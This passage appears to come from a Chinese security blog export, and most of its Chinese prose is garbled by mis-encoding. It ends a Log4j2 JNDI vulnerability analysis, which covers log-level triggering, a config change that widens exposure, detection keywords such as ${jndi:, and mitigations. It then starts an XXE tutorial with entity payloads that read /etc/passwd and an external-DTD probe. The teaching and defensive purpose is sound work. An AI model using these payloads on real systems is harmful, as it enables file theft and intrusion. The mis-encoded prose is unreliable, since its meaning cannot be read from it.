¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œè§£æè½¬æ¢ï¼Œè¯»å–ç¯å¢ƒå˜é‡ã€‚æ­¤æ—¶ä¸ºjndiçš„æ–¹å¼çš„è¯ï¼Œå°±å­˜åœ¨æ¼æ´ã€‚ è€Œåœ¨ä¸Šè¿°çš„è·Ÿè¸ªè¿‡ç¨‹ä¹‹åæˆ‘ä»¬å‘ç°æˆåŠŸè°ƒç”¨äº†jndilookupæ–¹æ³•ï¼Œæœ€ç»ˆè¾¾æˆäº†RCEã€‚ è€Œååæ˜¯jndiå¼•èµ·æ¼æ´çš„åŸå› ä¸ºï¼š åœ¨ Apache Log4j 2.x çš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªä¸å®‰å…¨çš„é»˜è®¤é…ç½®ï¼Œå…è®¸è§£æ ${java:...} å½¢å¼çš„ JNDI å˜é‡ã€‚è¿™æ˜¯å› ä¸º Log4j 2.x æ”¯æŒä½¿ç”¨å„ç§å„æ ·çš„å˜é‡æ¥åŠ¨æ€åœ°å¼•ç”¨é…ç½®æ–‡ä»¶ä¸­çš„å€¼ï¼ŒåŒ…æ‹¬ç³»ç»Ÿå±æ€§ã€ç¯å¢ƒå˜é‡ã€JNDI å˜é‡ç­‰ã€‚ç„¶è€Œï¼ŒJNDI å˜é‡çš„å¤„ç†åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¢«æ»¥ç”¨ï¼Œå¯¼è‡´äº†æ¼æ´çš„å‡ºç°ã€‚ é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œloggeræœ‰å¾ˆå¤šæ–¹æ³•ï¼Œé™¤äº†errorä»¥å¤–è¿˜åˆ«æ–¹æ³•å¯ä»¥è§¦å‘æ¼æ´ä¹ˆï¼Ÿè¿™é‡Œå°±è¦æåˆ°Log4j2çš„æ—¥å¿—ä¼˜å…ˆçº§é—®é¢˜ï¼Œæ¯ä¸ªä¼˜å…ˆçº§å¯¹åº”ä¸€ä¸ªæ•°å€¼intLevelè®°å½•åœ¨StandardLevelè¿™ä¸ªæšä¸¾ç±»å‹ä¸­ï¼Œæ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å½“æˆ‘ä»¬æ‰§è¡ŒLogger.errorçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨Logger.logIfEnabledæ–¹æ³•è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œè€Œåˆ¤æ–­çš„ä¾æ®å°±æ˜¯è¿™ä¸ªæ—¥å¿—ä¼˜å…ˆçº§çš„æ•°å€¼å¤§å° è·Ÿè¿›isEnabledæ–¹æ³•å‘ç°ï¼Œåªæœ‰å½“å‰æ—¥å¿—ä¼˜å…ˆçº§æ•°å€¼å°äºLog4j2çš„200çš„æ—¶å€™ï¼Œç¨‹åºæ‰ä¼šç»§ç»­å¾€ä¸‹èµ°ï¼Œå¦‚ä¸‹æ‰€ç¤º è€Œè¿™é‡Œæ—¥å¿—ä¼˜å…ˆçº§æ•°å€¼å°äºç­‰äº200çš„å°±åªæœ‰\"error\"ã€â€œfatalâ€ï¼Œè¿™ä¸¤ä¸ªï¼Œæ‰€ä»¥logger.fatal()æ–¹æ³•ä¹Ÿå¯è§¦å‘æ¼æ´ã€‚ä½†æ˜¯\"warn\"ã€\"info\"ç­‰å¤§äº200çš„å°±è§¦å‘ä¸äº†äº†ã€‚ ä½†æ˜¯è¿™é‡Œä¹Ÿè¯´äº†æ˜¯é»˜è®¤æƒ…å†µä¸‹ï¼Œæ—¥å¿—ä¼˜å…ˆçº§æ˜¯ä»¥errorä¸ºå‡†ï¼ŒLog4j2çš„ç¼ºçœé…ç½®æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºã€‚ &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;Configuration status=\"WARN\"&gt; &lt;Appenders&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\"&gt; &lt;PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=\"error\"&gt; &lt;AppenderRef ref=\"Console\"/&gt; &lt;/Root&gt; &lt;/Loggers&gt; &lt;/Configuration&gt; æ‰€ä»¥åªéœ€è¦åšä¸€ç‚¹ç®€å•çš„ä¿®æ”¹ï¼Œå°†&lt;Root level=\"error\"&gt;ä¸­çš„erroræ”¹æˆä¸€ä¸ªä¼˜å…ˆçº§æ¯”è¾ƒä½çš„ï¼Œä¾‹å¦‚\"info\"è¿™æ ·ï¼Œåªè¦æ—¥å¿—ä¼˜å…ˆçº§é«˜äºæˆ–è€…ç­‰äºinfoçš„å°±å¯ä»¥è§¦å‘æ¼æ´ï¼Œä¿®æ”¹è¿‡åå¦‚ä¸‹æ‰€ç¤º &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;Configuration status=\"WARN\"&gt; &lt;Appenders&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\"&gt; &lt;PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=\"info\"&gt; &lt;AppenderRef ref=\"Console\"/&gt; &lt;/Root&gt; &lt;/Loggers&gt; &lt;/Configuration&gt; å…³äºJndiéƒ¨åˆ†çš„è¿œç¨‹ç±»åŠ è½½åˆ©ç”¨å¯ä»¥å‚è€ƒå®éªŒå®¤å¾€å¸¸çš„æ–‡ç« ï¼šJavaååºåˆ—åŒ–è¿‡ç¨‹ä¸­ RMI JRMP ä»¥åŠJNDIå¤šç§åˆ©ç”¨æ–¹å¼è¯¦è§£ã€JAVA JNDIæ³¨å…¥çŸ¥è¯†è¯¦è§£ 0x08 å…¥ä¾µæ’æŸ¥ 1. æ—¥å¿—æ’æŸ¥ æ”»å‡»è€…åœ¨åˆ©ç”¨å‰é€šå¸¸é‡‡ç”¨dnslogæ–¹å¼è¿›è¡Œæ‰«ææ¢æµ‹ï¼Œå¯¹äºå¸¸è§åˆ©ç”¨æ–¹å¼å¯é€šè¿‡åº”ç”¨ç³»ç»ŸæŠ¥é”™æ—¥å¿—ä¸­å¯¹ä»¥ä¸‹å…³é”®å­—è¿›è¡Œæ’æŸ¥ã€‚ \"javax.naming.CommunicationException\" \"javax.naming.NamingException: problem generating object using object factory\" \"Error looking up JNDI resource\" 2. æµé‡æ’æŸ¥ æ’æŸ¥æ—¥å¿—æˆ–è€…è§£ç åå®Œæ•´çš„è¯·æ±‚æ•°æ®åŒ…ä¸­æ˜¯å¦å­˜åœ¨${jndi:å…³é”®å­—}ã€‚ æ’æŸ¥æ—¥å¿—æ˜¯å¦å­˜åœ¨ç›¸å…³å †æ ˆæŠ¥é”™ï¼Œå †æ ˆé‡Œæ˜¯å¦æœ‰JndiLookupã€ldapURLContextã€getObjectFactoryFromReferenceç­‰ä¸ jndi è°ƒç”¨ç›¸å…³çš„å †æ ˆä¿¡æ¯ã€‚ 0x09 æ¼æ´ä¿®å¤ æ’æŸ¥åº”ç”¨æ˜¯å¦å¼•å…¥äº†Apache Log4j2 JaråŒ…ï¼Œè‹¥å­˜åœ¨ä¾èµ–å¼•å…¥ï¼Œåˆ™å¯èƒ½å­˜åœ¨æ¼æ´å½±å“ã€‚å°½å¿«å‡çº§Apache Log4j2æ‰€æœ‰ç›¸å…³åº”ç”¨åˆ°æœ€æ–°çš„ç‰ˆæœ¬ï¼šhttps://github.com/apache/logging-log4j2 ç¼“è§£æªæ–½ï¼š æ·»åŠ  jvm å¯åŠ¨å‚æ•° -Dlog4j2.formatMsgNoLookups=true åœ¨åº”â½¤ç¨‹åºçš„ classpath ä¸‹æ·»åŠ  log4j2.component.properties é…ç½®â½‚ä»¶â½‚ä»¶ï¼Œ â½‚ä»¶å†…å®¹ï¼šlog4j2.formatMsgNoLookups=True ç§»é™¤ log4j-core åŒ…ä¸­ JndiLookup ç±»â½‚ä»¶å¹¶é‡å¯æœåŠ¡ å„å¤§å‚å•†é’ˆå¯¹log4j2æ¼æ´åº”æ€¥æ–¹æ¡ˆé›†åˆï¼šhttps://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g å‚è€ƒæ–‡ç«  å‰ç½®åŸºç¡€çŸ¥è¯†å‚è€ƒï¼šhttps://blog.csdn.net/qq_43531669/article/details/123562530 å¤ç°è¿‡ç¨‹å‚è€ƒ1ï¼šhttp://www.luckysec.cn/posts/e991b2d2.html#toc-heading-5 å¤ç°è¿‡ç¨‹å‚è€ƒ2ï¼šhttps://blog.csdn.net/weixin_55843787/article/details/124707658?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2æ¼æ´å¤ç°-vulfocus&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124707658.142^v91^insertT0,239^v12^insert_chatgpt&amp;spm=1018.2226.3001.4187 å¤ç°è¿‡ç¨‹å‚è€ƒ3ï¼šhttps://paper.seebug.org/1789/#0x05 ç»•è¿‡æ–¹æ³•å‚è€ƒï¼šhttps://www.freebuf.com/articles/network/316590.html","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"æµ…æxxeæ¼æ´","path":"/2023/07/29/qian-xi-xxe-lou-dong/","content":"ä¸€ã€XMLç®€ä»‹ XMLï¼Œå³Extensible Markdown Languageï¼Œå¯æ‰©å±•æ ‡è®°è¯­è¨€çš„ç¼©å†™ã€‚XMLæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ï¼Œå¯ä»¥ç”¨äºæ ‡è®°æ•°æ®ï¼Œå®šä¹‰æ•°æ®ç±»å‹ã€‚XMLæ˜¯æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ï¼Œå…·æœ‰å¯æ‰©å±•æ€§å¥½ã€å†…å®¹ä¸å½¢å¼åˆ†ç¦»ã€è¯­æ³•è¦æ±‚ä¸¥æ ¼ã€ä¿å€¼æ€§å¥½ç­‰ä¼˜ç‚¹ã€‚ XMLä¸HTMLéå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯XMLçš„è®¾è®¡å®—æ—¨æ˜¯ç”¨äºä¼ è¾“æ•°æ®ï¼Œè€ŒHTMLçš„è®¾è®¡å®—æ—¨æ˜¯ç”¨äºå±•ç¤ºæ•°æ®ã€‚XMLçš„æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªå·±å®šä¹‰æ ‡ç­¾ã€‚ äºŒã€XMLè¯­æ³•è§„åˆ™ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥è®²è§£XMLè¯­æ³•è§„åˆ™ã€‚ ï¼ˆä¸€ï¼‰XMLåŸºæœ¬è¯­æ³• ä¸€ä¸ªå…¸å‹çš„XMLæ–‡æ¡£å¦‚ä¸‹æ‰€ç¤ºï¼š &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;person&gt; &lt;name&gt;Bob&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;address&gt;1-1-110&lt;/address&gt; &lt;country&gt;China&lt;/country&gt; &lt;major&gt;History&lt;/major&gt; &lt;/person&gt; åœ¨ä¸Šè¿°æ–‡æ¡£ä¸­ï¼Œç¬¬ä¸€è¡Œæ˜¯XMLæ–‡æ¡£çš„å¤´éƒ¨å£°æ˜ï¼ŒæŒ‡æ˜äº†XMLæ–‡æ¡£çš„ç‰ˆæœ¬å·å’Œç¼–ç ã€‚XMLå¯¹äºå¤´éƒ¨å£°æ˜å¹¶ä¸ä¸¥æ ¼è¦æ±‚ï¼Œå¯æœ‰å¯æ— ï¼Œä½†æ˜¯ä¸€èˆ¬æœ€å¥½å†™ä¸Šå¤´éƒ¨å£°æ˜ã€‚ åœ¨XMLæ–‡æ¡£ä¸­ï¼Œå¿…é¡»å­˜åœ¨ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œæ ¹èŠ‚ç‚¹æ˜¯å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œåœ¨ä¸Šè¿°æ–‡æ¡£ä¸­ï¼Œæ ¹èŠ‚ç‚¹æ˜¯personã€‚åœ¨XMLä¸­ï¼Œæ‰€æœ‰çš„æ ‡ç­¾å¿…é¡»æˆå¯¹å‡ºç°ï¼Œæ ‡ç­¾ååŒºåˆ†å¤§å°å†™å¹¶ä¸”æ ‡ç­¾ä¸èƒ½äº¤å‰ã€‚ä½†æ˜¯æ ‡ç­¾åç§°å¯ä»¥è‡ªè¡Œå®šä¹‰ã€‚ ï¼ˆäºŒï¼‰XMLæ³¨é‡Š XMLæ–‡æ¡£ä¸­å¯ä»¥ä½¿ç”¨æ³¨é‡Šï¼Œæ³¨é‡Šçš„ä½¿ç”¨æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š &lt;!--This is annotation--&gt; ï¼ˆä¸‰ï¼‰XMLå±æ€§ XMLæ”¯æŒåœ¨æ ‡ç­¾å…ƒç´ ä¸­å®šä¹‰å±æ€§ï¼Œå†™æ³•ç±»ä¼¼äºHTMLï¼Œç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤ºï¼š &lt;name len=\"3\"&gt;Bob&lt;/name&gt; XMLè§„å®šï¼Œä¸€ä¸ªæ ‡ç­¾å¯ä»¥æœ‰å¤šä¸ªå±æ€§ï¼Œä½†æ˜¯å±æ€§çš„å€¼å¿…é¡»ä½¿ç”¨å¼•å·æ‹¬èµ·æ¥ã€‚ ï¼ˆå››ï¼‰XMLç‰¹æ®Šå­—ç¬¦å¤„ç† XMLå¦‚æœæƒ³è¡¨è¾¾ç‰¹æ®Šå­—ç¬¦ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ã€‚ ç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ï¼Œå¸¸ç”¨çš„è½¬ä¹‰å­—ç¬¦å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š ç¬¬äºŒç§æ–¹å¼æ˜¯ä½¿ç”¨CDATAåŒºåŸŸï¼ŒCDATAåŒºåŸŸå®šä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š &lt;![CDATA[ã€CDATAåŒºåŸŸå†…å®¹ã€‘]]&gt; XMLè§„å®šï¼Œå¯¹CDATAåŒºåŸŸå†…çš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦ä¸è¿›è¡Œè§£æã€‚ ä¸‰ã€XMLæ–‡æ¡£ç»“æ„ XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ï¼ŒåŒæ—¶XXEæ¼æ´å’ŒDTDæ–‡æ¡£ç›¸å…³ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦å¯¹DTDè¿›è¡Œä»‹ç»ã€‚ &lt;!--XMLç”³æ˜--&gt; &lt;?xml version=\"1.0\"?&gt; &lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt; &lt;!DOCTYPE note [ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt; &lt;!ELEMENT note (to,from,head,body)&gt; &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]]]&gt; ä¸Šé¢è¿™ä¸ª DTD å°±å®šä¹‰äº† XML çš„æ ¹å…ƒç´ æ˜¯ noteï¼Œç„¶åè·Ÿå…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆ XML åˆ°æ—¶å€™å¿…é¡»åƒä¸‹é¢è¿™ä¹ˆå†™ &lt;!--æ–‡æ¡£å…ƒç´ --&gt; &lt;note&gt; &lt;to&gt;Dave&lt;/to&gt; &lt;from&gt;Tom&lt;/from&gt; &lt;head&gt;Reminder&lt;/head&gt; &lt;body&gt;You are a good man&lt;/body&gt; &lt;/note&gt; å››ã€DTDä»‹ç» æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼ˆå†…éƒ¨å¼•ç”¨ï¼‰ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚ å†…éƒ¨æ–‡æ¡£å£°åDTD:&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; å¤–éƒ¨æ–‡æ¡£å£°æ˜DTD:&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM \"æ–‡ä»¶å\"&gt; DTDæ–‡æ¡£ä¸­æœ‰å¾ˆå¤šé‡è¦çš„å…³é”®å­—å¦‚ä¸‹ï¼š DOCTYPEï¼ˆDTDçš„å£°æ˜ï¼‰ ENTITYï¼ˆå®ä½“çš„å£°æ˜ï¼‰ SYSTEMã€PUBLICï¼ˆå¤–éƒ¨èµ„æºç”³è¯·ï¼‰ å…¶å®é™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®ä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ï¼Œæ¯•ç«Ÿ XML ä¸­é™¤äº†æ ‡ç­¾ä»¥å¤–ï¼Œè¿˜éœ€è¦æœ‰äº›å†…å®¹æ˜¯å›ºå®šçš„ å®ä¾‹ï¼š &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe \"test\" &gt;]&gt; è¿™é‡Œå®šä¹‰å…ƒç´ ä¸º ANY ï¼Œæ„æ€æ˜¯å¯ä»¥æ¥æ”¶ä»»ä½•å…ƒç´ ï¼Œæ¥ç€å®šä¹‰äº†ä¸€ä¸ªXMLå®ä½“ï¼Œè¿™ä¸ªå®ä½“æˆ‘ä»¬å¯ä»¥çœ‹åšä¸€ä¸ªå˜é‡ï¼Œåœ¨åç»­æˆ‘ä»¬å¯ä»¥é€šè¿‡ &amp; ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼Œé‚£ä¹ˆåç»­çš„XMLåº”è¯¥è¿™æ ·å†™ &lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt; &lt;/creds&gt; æˆ‘ä»¬é€šè¿‡ &amp;xxe å¯¹ä¸Šè¿°å®šä¹‰çš„å®ä½“xxeè¿›è¡Œå¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºç»“æœå°±ä¼šå°†å…¶æ›¿æ¢ä¸ºtestã€‚ å®ä½“æ ¹æ®å¼•ç”¨æ–¹å¼ï¼Œè¿˜å¯åˆ†ä¸ºå†…éƒ¨å®ä½“ä¸å¤–éƒ¨å®ä½“ï¼Œçœ‹çœ‹è¿™äº›å®ä½“çš„ç”³æ˜æ–¹å¼ã€‚ 1.1 å†…éƒ¨å®ä½“å£°æ˜ å†…éƒ¨å£°æ˜é‡‡ç”¨å¦‚ä¸‹æ ¼å¼å®šä¹‰ï¼š &lt;!ENTITY å®ä½“å \"å®ä½“å€¼\"&gt; å£°æ˜ä¹‹åå°±å¯ä»¥é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥è·å–ï¼Œç¤ºä¾‹å¦‚ä¸‹ &lt;!DOCTYPE foo [&lt;!ENTITY test \"john\"&gt;]&gt; &lt;foo&gt; &lt;name&gt;&amp;test;&lt;/name&gt; &lt;/foo&gt; 1.2 å¤–éƒ¨å®ä½“å£°æ˜ XXE çš„äº§ç”Ÿæ­£æ˜¯å¤–éƒ¨å®ä½“å¼•ç”¨çš„ç»“æœï¼Œå¯åˆ†ä¸ºé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚ ï¼ˆ1ï¼‰é€šç”¨å®ä½“å£°æ˜æ ¼å¼å¦‚ä¸‹ï¼š &lt;!ENTITY å®ä½“å SYSTEM \"URI\"&gt; æˆ–è€… &lt;!ENTITY å®ä½“å PUBLIC \"public_ID\" \"URI\"&gt; //å¼•ç”¨å…¬ç”¨DTDæ–‡ä»¶ ä¸¾ä¸ªä¾‹å­ï¼š &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; å£°æ˜å®ä½“ xxeï¼Œç”¨äºè¯»å– /etc/passwd æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ &amp;xxe; æ¥å¼•ç”¨æ‰§è¡Œã€‚ ï¼ˆ2ï¼‰å‚æ•°å®ä½“å£°æ˜ä¸»è¦ç”¨äºåç»­ä½¿ç”¨ï¼Œä¸é€šç”¨å®ä½“ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸­é—´æœ‰ç™¾åˆ†å·å­—ç¬¦ï¼ˆ%ï¼‰ï¼Œå…¶å£°æ˜æ ¼å¼ å¦‚ä¸‹ï¼š &lt;!ENTITY % å®ä½“åç§° \"å®ä½“çš„å€¼\"&gt; æˆ–è€… &lt;!ENTITY % å®ä½“åç§° SYSTEM \"URI\"&gt; æ³¨æ„ï¼š (1)ä½¿ç”¨ % å®ä½“å(è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘) åœ¨ DTD ä¸­å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨%å®ä½“å;å¼•ç”¨ (2)åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“ (3)å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ å®ä¾‹ï¼š &lt;!ENTITY % an-element \"&lt;!ELEMENT mytag (subtag)&gt;\"&gt; &lt;!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"&gt; %an-element; %remote-dtd; å‚æ•°å®ä½“åœ¨æˆ‘ä»¬ Blind XXE ä¸­èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ 1.3 å¤–éƒ¨å®ä½“ ç”±äºXXEæ¼æ´ä¸»è¦æ˜¯åˆ©ç”¨å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œè€Œå¯¼è‡´çš„æ¼æ´ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦äº†è§£å¤–éƒ¨å®ä½“ã€‚è€Œå¤–éƒ¨å®ä½“åˆåˆ†ä¸ºå¾ˆå¤šçš„ç±»å‹ã€‚è¿™é‡Œé¢çš„ç±»å‹ä¸€äº›æ˜¯åœ¨ä¹‹å‰æ¯”å¦‚æ–‡ä»¶åŒ…å«ç­‰ä¸­æåˆ°çš„ä¸€äº›åè®®ï¼Œä»¥åŠæœªæåŠåˆ°çš„åè®®ã€‚ å¤–éƒ¨å®ä½“åœ¨DTDä¸­ä½¿ç”¨ &lt;!ENTITY å®ä½“åç§° SYSTEM \"URI\"&gt; æ ¹æ®ç¨‹åºä¸åŒï¼Œèƒ½å¤Ÿå¼•å…¥çš„å®ä½“ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œä¾‹å¦‚ï¼š ä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰ å¤–éƒ¨å®ä½“æ¼”ç¤ºï¼š &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt; &lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt; äº”ã€XXEæ¼æ´åŸºæœ¬ä»‹ç» 1.1 XXEæ¼æ´åŸºæœ¬æ¦‚å¿µ XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒXMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXEæ¼æ´å…¨ç§°XMLExternal Entity Injectionï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ã€‚ XMLå°±æ˜¯ä¼ è¾“å’Œå­˜å‚¨æ•°æ®çš„ä¸€ä¸ªç±»å‹ã€‚ XXEå°±æ˜¯xmlçš„æ¼æ´æ³¨å…¥çš„å…¨ç§°ã€‚ 1.2 XXEæ¼æ´å±å®³ XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚ 1.3 XXEæ¼æ´è¾“å‡ºå½¢å¼ XXEæ¼æ´çš„è¾“å‡ºæ˜¾ç¤ºåˆ†ä¸ºï¼šæœ‰å›æ˜¾ã€æ— å›æ˜¾ã€‚ æœ‰å›æ˜¾å°±èƒ½å¤Ÿé…åˆåè®®ä»¥åŠå¤–éƒ¨å¼•å…¥è¿›è¡Œæ”»å‡»ã€‚ æ— å›æ˜¾å°±éœ€è¦é…åˆå¤–éƒ¨å¼•å…¥-åå‘é“¾æ¥é…åˆã€‚ 1.4 XXEæ¼æ´ç›¸å…³å·®å¼‚ XMLå’ŒHTMLçš„å·®å¼‚ XMLè¢«è®¾è®¡ä¸ºæ•°æ®ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚ HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚ HTMLæŒ‡åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæŒ‡åœ¨ä¼ è¾“æ•°æ®ã€‚ å…­ã€XXEæ¼æ´æ£€æµ‹ ç¬¬ä¸€æ­¥æ£€æµ‹XMLæ˜¯å¦ä¼šè¢«æˆåŠŸè§£æï¼š &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name \"my name is nMask\"&gt;]&gt; &lt;root&gt;&amp;name;&lt;/root&gt; å¦‚æœé¡µé¢è¾“å‡ºäº†my name is nMaskï¼Œè¯´æ˜xmlæ–‡ä»¶å¯ä»¥è¢«è§£æã€‚ ç¬¬äºŒæ­¥æ£€æµ‹æœåŠ¡å™¨æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“ï¼š &lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM \"http://localhost/index.html\"&gt; %name; ]&gt; å¯é€šè¿‡æŸ¥çœ‹è‡ªå·±æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—æ¥åˆ¤æ–­ï¼Œçœ‹ç›®æ ‡æœåŠ¡å™¨æ˜¯å¦å‘ä½ 